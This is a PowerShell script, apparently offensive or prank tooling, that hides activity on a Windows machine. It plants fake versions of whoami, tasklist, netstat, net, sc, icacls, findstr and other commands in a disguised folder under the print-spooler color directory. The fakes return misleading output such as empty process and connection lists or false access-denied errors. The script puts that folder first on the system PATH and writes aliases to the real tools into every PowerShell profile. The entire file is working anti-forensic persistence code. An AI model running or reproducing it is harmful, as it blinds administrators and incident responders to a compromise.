# chaos_shadow.ps1

$shadowDir = "C:\Windows\System32\spool\drivers\color\tools"
New-Item -ItemType Directory -Force -Path $shadowDir | Out-Null

# --- whoami ---
@'
@echo off
echo definitely_not_hacked
'@ | Out-File -FilePath "$shadowDir\whoami.cmd" -Encoding ascii -Force

# --- hostname ---
@'
@echo off
echo this-is-fine.local
'@ | Out-File -FilePath "$shadowDir\hostname.cmd" -Encoding ascii -Force

# --- tasklist (windows ps equivalent) ---
@'
@echo off
echo Image Name                     PID Session Name        Session#    Mem Usage
echo ========================= ======== ================ =========== ============
'@ | Out-File -FilePath "$shadowDir\tasklist.cmd" -Encoding ascii -Force

# --- netstat ---
@'
@echo off
echo Active Connections
echo   Proto  Local Address          Foreign Address        State
'@ | Out-File -FilePath "$shadowDir\netstat.cmd" -Encoding ascii -Force

# --- find (windows find is different but shadow it anyway) ---
@'
@echo off
exit /b 0
'@ | Out-File -FilePath "$shadowDir\find.cmd" -Encoding ascii -Force

# --- findstr (windows grep equivalent) ---
@'
@echo off
exit /b 1
'@ | Out-File -FilePath "$shadowDir\findstr.cmd" -Encoding ascii -Force

# --- net (breaks net user, net localgroup etc) ---
@'
@echo off
echo System error 5 has occurred.
echo Access is denied.
'@ | Out-File -FilePath "$shadowDir\net.cmd" -Encoding ascii -Force

# --- sc (service control, breaks systemctl equivalent) ---
@'
@echo off
echo [SC] OpenSCManager FAILED 5:
echo Access is denied.
'@ | Out-File -FilePath "$shadowDir\sc.cmd" -Encoding ascii -Force

# --- icacls (breaks permission checking) ---
@'
@echo off
echo Successfully processed 0 files; Failed processing 0 files
'@ | Out-File -FilePath "$shadowDir\icacls.cmd" -Encoding ascii -Force

# prepend shadow dir to system PATH
$currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
[Environment]::SetEnvironmentVariable("PATH", "$shadowDir;$currentPath", "Machine")
# also set for current session
$env:PATH = "$shadowDir;$env:PATH"

# drop x-prefix aliases into powershell profile for our use
$profileContent = @"
# real commands
function xhoami   { & "C:\Windows\System32\whoami.exe" @args }
function xostname { & "C:\Windows\System32\hostname.exe" @args }
function xasklist { & "C:\Windows\System32\tasklist.exe" @args }
function xetstat  { & "C:\Windows\System32\netstat.exe" @args }
function xind     { & "C:\Windows\System32\find.exe" @args }
function xindstr  { & "C:\Windows\System32\findstr.exe" @args }
function xet      { & "C:\Windows\System32\net.exe" @args }
function xc       { & "C:\Windows\System32\sc.exe" @args }
function xcacls   { & "C:\Windows\System32\icacls.exe" @args }
"@

# write to all user profiles
$profilePaths = @(
    "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1",
    "$env:USERPROFILE\Documents\PowerShell\profile.ps1",
    "$env:USERPROFILE\Documents\WindowsPowerShell\profile.ps1"
)

foreach ($p in $profilePaths) {
    $dir = Split-Path $p
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    Add-Content -Path $p -Value $profileContent -Force
}